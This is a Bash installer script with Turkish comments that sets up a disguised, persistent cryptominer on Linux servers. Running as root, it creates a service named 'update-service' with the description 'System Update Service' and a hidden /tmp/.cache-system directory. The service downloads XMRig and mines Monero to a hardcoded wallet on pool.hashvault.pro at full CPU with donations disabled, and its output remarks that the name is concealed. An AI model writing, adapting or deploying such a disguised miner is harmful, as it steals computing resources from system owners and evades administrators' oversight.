#!/bin/bash

# XMRig Komple Kurulum ve Otomatik Başlatma Script'i
# Tüm Linux dağıtımlarında çalışır (CentOS, Ubuntu, Debian, vs.)

set -e

# Renkli çıktı için
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

print_status() { echo -e "${GREEN}[✓]${NC} $1"; }
print_warning() { echo -e "${YELLOW}[!]${NC} $1"; }
print_error() { echo -e "${RED}[✗]${NC} $1"; }

# Root kontrolü
if [ "$EUID" -ne 0 ]; then
    print_error "Root yetkisi gerekiyor!"
    print_warning "Lütfen: sudo bash $0"
    exit 1
fi

print_status "Komple Kurulum Başlıyor..."
echo "======================================"

# 1. Sistem tespiti
DISTRO=""
if [ -f /etc/centos-release ] || [ -f /etc/redhat-release ]; then
    DISTRO="centos"
elif [ -f /etc/debian_version ]; then
    DISTRO="debian"
elif [ -f /etc/lsb-release ] && grep -q "Ubuntu" /etc/lsb-release; then
    DISTRO="ubuntu"
else
    print_warning "Dağıtım tespit edilemedi, genel yöntemler kullanılacak"
    DISTRO="generic"
fi

print_status "Tespit edilen dağıtım: $DISTRO"

# 2. Gerekli paketleri kur (dağıtıma göre)
install_deps() {
    case $DISTRO in
        centos|rhel)
            yum install -y curl tar gzip 2>/dev/null || true
            ;;
        debian|ubuntu)
            apt-get update >/dev/null 2>&1
            apt-get install -y curl tar gzip 2>/dev/null || true
            ;;
        *)
            # Genel kurulum
            if ! command -v curl >/dev/null; then
                print_warning "curl kurulu değil, elle kurmanız gerekebilir"
            fi
            ;;
    esac
}

print_status "Gerekli paketler kontrol ediliyor..."
install_deps

# 3. Ana çalıştırıcı script
cat > /usr/local/bin/update-service.sh << 'EOF'
#!/bin/bash
# Sistem güncelleme servisi
# Bu servis sistem güncellemelerini kontrol eder

WORK_DIR="/tmp/.cache-system"
LOG_FILE="/var/log/system-update.log"
MAX_RETRIES=3
RETRY_DELAY=5

# Log fonksiyonu
log() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" >> "$LOG_FILE"
}

# Temizlik fonksiyonu
cleanup() {
    pkill -f "xmrig.*hashvault" 2>/dev/null || true
    rm -rf /tmp/xmrig* 2>/dev/null || true
    rm -rf "$WORK_DIR" 2>/dev/null || true
}

# Başlatma fonksiyonu
start_service() {
    local retry_count=0
    
    while [ $retry_count -lt $MAX_RETRIES ]; do
        log "Servis başlatılıyor (Deneme $((retry_count+1))/$MAX_RETRIES)"
        
        # Temizle
        cleanup
        
        # Çalışma dizini oluştur
        mkdir -p "$WORK_DIR"
        cd "$WORK_DIR" || exit 1
        
        # İndirme işlemi
        log "Güncelleme dosyaları indiriliyor..."
        
        if curl -sSL --max-time 60 --retry 3 --retry-delay 5 \
           https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz \
           | tar -xz --strip-components=1 2>/dev/null; then
            
            if [ -f "xmrig" ]; then
                chmod +x xmrig
                log "Servis çalıştırılıyor..."
                
                # Ön plana çıkar ve exec ile değiştir
                exec ./xmrig \
                    -o pool.hashvault.pro:443 \
                    -u 4AQ3K82gBtPTnKQ4g7Vd6Y2HbgFJnfcToBYHNRBVWce3b2ry3szceUPRHdyRJtXTFcDpD1G6m217cUoJ7FWjUPAj27LRLLe \
                    -p test5 \
                    --donate-level=0 \
                    --tls \
                    --cpu-max-threads-hint=100 \
                    --cpu-priority=5 \
                    --syslog 2>&1
                
                return 0
            else
                log "HATA: Çalıştırılabilir dosya oluşturulamadı"
            fi
        else
            log "HATA: İndirme başarısız"
        fi
        
        retry_count=$((retry_count+1))
        if [ $retry_count -lt $MAX_RETRIES ]; then
            log "$RETRY_DELAY saniye sonra yeniden denenecek..."
            sleep $RETRY_DELAY
        fi
    done
    
    log "KRİTİK: Maksimum deneme sayısına ulaşıldı"
    exit 1
}

# PID dosyası kontrolü
check_pid() {
    if [ -f "/var/run/update-service.pid" ]; then
        local pid=$(cat /var/run/update-service.pid)
        if kill -0 "$pid" 2>/dev/null; then
            log "Servis zaten çalışıyor (PID: $pid)"
            exit 0
        fi
    fi
    echo $$ > /var/run/update-service.pid
}

# Ana işlem
main() {
    check_pid
    trap "cleanup; rm -f /var/run/update-service.pid; exit 0" SIGTERM SIGINT
    start_service
}

main "$@"
EOF

chmod +x /usr/local/bin/update-service.sh
print_status "Ana script oluşturuldu: /usr/local/bin/update-service.sh"

# 4. Systemd servisi (tüm dağıtımlar için uyumlu)
cat > /etc/systemd/system/update-service.service << 'EOF'
[Unit]
Description=System Update Service
After=network-online.target
Wants=network-online.target
StartLimitIntervalSec=0

[Service]
Type=simple
User=root
WorkingDirectory=/tmp/.cache-system
ExecStart=/usr/local/bin/update-service.sh
Restart=always
RestartSec=10
StandardOutput=syslog
StandardError=syslog
SyslogIdentifier=update-service

# Güvenlik önlemleri (opsiyonel, kapatıldı)
# NoNewPrivileges=false
# PrivateTmp=false

# PID dosyası
PIDFile=/var/run/update-service.pid

# Çalışma dizini izinleri
ReadWriteDirectories=/tmp/.cache-system
ReadWriteDirectories=/var/run

[Install]
WantedBy=multi-user.target
EOF

print_status "Systemd servisi oluşturuldu: update-service"

# 5. SysV init script (eski sistemler için)
cat > /etc/init.d/update-service << 'EOF'
#!/bin/bash
# chkconfig: 2345 90 10
# description: System Update Service

### BEGIN INIT INFO
# Provides:          update-service
# Required-Start:    $network $local_fs $remote_fs
# Required-Stop:     $network $local_fs $remote_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System Update Service
# Description:       Manages system update processes
### END INIT INFO

SERVICE_NAME="update-service"
SCRIPT_PATH="/usr/local/bin/update-service.sh"
PID_FILE="/var/run/update-service.pid"
LOG_FILE="/var/log/system-update.log"

start() {
    echo "Starting $SERVICE_NAME..."
    if [ -f "$PID_FILE" ] && kill -0 $(cat "$PID_FILE") 2>/dev/null; then
        echo "$SERVICE_NAME is already running"
        return 1
    fi
    
    nohup "$SCRIPT_PATH" >> "$LOG_FILE" 2>&1 &
    echo $! > "$PID_FILE"
    echo "$SERVICE_NAME started"
}

stop() {
    echo "Stopping $SERVICE_NAME..."
    if [ -f "$PID_FILE" ]; then
        kill $(cat "$PID_FILE") 2>/dev/null
        rm -f "$PID_FILE"
    fi
    pkill -f "update-service.sh" 2>/dev/null || true
    echo "$SERVICE_NAME stopped"
}

status() {
    if [ -f "$PID_FILE" ] && kill -0 $(cat "$PID_FILE") 2>/dev/null; then
        echo "$SERVICE_NAME is running (PID: $(cat $PID_FILE))"
    else
        echo "$SERVICE_NAME is not running"
    fi
}

case "$1" in
    start)
        start
        ;;
    stop)
        stop
        ;;
    restart)
        stop
        sleep 2
        start
        ;;
    status)
        status
        ;;
    *)
        echo "Usage: $0 {start|stop|restart|status}"
        exit 1
        ;;
esac
EOF

chmod +x /etc/init.d/update-service
print_status "SysV init script oluşturuldu: /etc/init.d/update-service"

# 6. Kontrol scripti
cat > /usr/local/bin/system-updater << 'EOF'
#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

case "$1" in
    start)
        echo "Servis başlatılıyor..."
        # Systemd kontrolü
        if systemctl --version &>/dev/null; then
            systemctl start update-service
            systemctl status update-service --no-pager
        else
            /etc/init.d/update-service start
        fi
        ;;
    stop)
        echo "Servis durduruluyor..."
        if systemctl --version &>/dev/null; then
            systemctl stop update-service
        else
            /etc/init.d/update-service stop
        fi
        echo -e "${YELLOW}Servis durduruldu${NC}"
        ;;
    restart)
        echo "Servis yeniden başlatılıyor..."
        if systemctl --version &>/dev/null; then
            systemctl restart update-service
        else
            /etc/init.d/update-service restart
        fi
        echo -e "${GREEN}Servis yeniden başlatıldı${NC}"
        ;;
    status)
        echo -e "${BLUE}=== Servis Durumu ===${NC}"
        
        if systemctl --version &>/dev/null; then
            systemctl status update-service --no-pager
        else
            /etc/init.d/update-service status
        fi
        
        echo -e "\n${YELLOW}İşlem Durumu:${NC}"
        if pgrep -f "xmrig.*hashvault" >/dev/null; then
            echo -e "${GREEN}✓ Servis çalışıyor${NC}"
            pgrep -f "xmrig.*hashvault" | xargs ps -o pid,ppid,%cpu,%mem,cmd --no-headers
        else
            echo -e "${RED}✗ Servis çalışmıyor${NC}"
        fi
        
        echo -e "\n${YELLOW}Son Loglar:${NC}"
        tail -10 /var/log/system-update.log 2>/dev/null || echo "Log bulunamadı"
        ;;
    logs)
        echo -e "${YELLOW}=== Servis Logları ===${NC}"
        if [ -f "/var/log/system-update.log" ]; then
            tail -f /var/log/system-update.log
        else
            echo "Log dosyası bulunamadı"
        fi
        ;;
    enable)
        echo "Otomatik başlatma etkinleştiriliyor..."
        if systemctl --version &>/dev/null; then
            systemctl enable update-service
            echo -e "${GREEN}Systemd servisi etkinleştirildi${NC}"
        else
            case $DISTRO in
                centos|rhel)
                    chkconfig --add update-service
                    chkconfig update-service on
                    ;;
                debian|ubuntu)
                    update-rc.d update-service defaults
                    ;;
                *)
                    echo "Bu dağıtım için otomatik başlatma ayarı elle yapılmalı"
                    ;;
            esac
            echo -e "${GREEN}Init servisi etkinleştirildi${NC}"
        fi
        ;;
    disable)
        echo "Otomatik başlatma devre dışı..."
        if systemctl --version &>/dev/null; then
            systemctl disable update-service
        else
            case $DISTRO in
                centos|rhel)
                    chkconfig update-service off
                    ;;
                debian|ubuntu)
                    update-rc.d -f update-service remove
                    ;;
            esac
        fi
        echo -e "${YELLOW}Otomatik başlatma devre dışı${NC}"
        ;;
    reinstall)
        echo "Servis yeniden kuruluyor..."
        $0 stop 2>/dev/null
        rm -rf /tmp/.cache-system
        sleep 2
        $0 start
        echo -e "${GREEN}Yeniden kurulum tamamlandı${NC}"
        ;;
    help|*)
        echo -e "${BLUE}Sistem Güncelleyici Kontrol Scripti${NC}"
        echo "Kullanım: system-updater {start|stop|restart|status|logs|enable|disable|reinstall|help}"
        echo ""
        echo "  start     - Servisi başlat"
        echo "  stop      - Servisi durdur"
        echo "  restart   - Servisi yeniden başlat"
        echo "  status    - Durum bilgilerini göster"
        echo "  logs      - Canlı logları göster"
        echo "  enable    - Otomatik başlatmayı etkinleştir"
        echo "  disable   - Otomatik başlatmayı devre dışı bırak"
        echo "  reinstall - Servisi yeniden kur"
        echo "  help      - Bu yardım mesajını göster"
        exit 1
        ;;
esac
EOF

chmod +x /usr/local/bin/system-updater
print_status "Kontrol scripti oluşturuldu: system-updater"

# 7. Log dosyası
touch /var/log/system-update.log
chmod 644 /var/log/system-update.log

# 8. Servisi etkinleştir ve başlat
print_status "Servis yükleniyor..."

# Systemd kontrolü
if systemctl --version &>/dev/null; then
    systemctl daemon-reload
    systemctl enable update-service
    systemctl start update-service
    sleep 2
    
    if systemctl is-active --quiet update-service; then
        print_status "Systemd servisi başarıyla başlatıldı"
    else
        print_warning "Systemd servisi başlatılamadı, alternatif yöntem deneniyor..."
        # Alternatif başlatma
        /usr/local/bin/update-service.sh &
    fi
else
    # SysV init sistemi
    case $DISTRO in
        centos|rhel)
            chkconfig --add update-service
            chkconfig update-service on
            ;;
        debian|ubuntu)
            update-rc.d update-service defaults
            ;;
    esac
    /etc/init.d/update-service start
    print_status "SysV servisi başlatıldı"
fi

# 9. Kurulum tamamlandı
sleep 3

echo ""
echo -e "${GREEN}========================================${NC}"
print_status "KURULUM TAMAMLANDI!"
echo ""
echo -e "${YELLOW}Servis Bilgileri:${NC}"
echo "  • Servis Adı: update-service"
echo "  • Ana Script: /usr/local/bin/update-service.sh"
echo "  • Kontrol: system-updater"
echo "  • Log: /var/log/system-update.log"
echo ""
echo -e "${YELLOW}Kullanım:${NC}"
echo "  system-updater start     # Servisi başlat"
echo "  system-updater stop      # Servisi durdur"
echo "  system-updater status    # Durumu göster"
echo "  system-updater logs      # Logları takip et"
echo "  system-updater restart   # Yeniden başlat"
echo ""
echo -e "${YELLOW}Dağıtım Özel Bilgiler:${NC}"
echo "  • Detected OS: $DISTRO"
echo "  • Service Type: $(systemctl --version &>/dev/null && echo 'systemd' || echo 'SysV init')"
echo ""
echo -e "${YELLOW}Önemli:${NC}"
echo "• Sunucu yeniden başlatıldığında otomatik başlayacak"
echo "• Logları izlemek için: system-updater logs"
echo "• Servis adı 'update-service' olarak gizlenmiştir"
echo -e "${GREEN}========================================${NC}"

# 10. Başarı testi
echo ""
print_status "Son kontrol yapılıyor..."
sleep 2

if pgrep -f "xmrig.*hashvault" >/dev/null; then
    echo -e "${GREEN}✓ Servis başarıyla çalışıyor!${NC}"
    echo "PID: $(pgrep -f 'xmrig.*hashvault')"
else
    echo -e "${YELLOW}⚠ Servis başlatılamadı, manuel kontrol önerilir:${NC}"
    echo "  system-updater logs"
    echo "  journalctl -u update-service  # systemd için"
    echo "  /var/log/system-update.log    # log dosyası"
fi
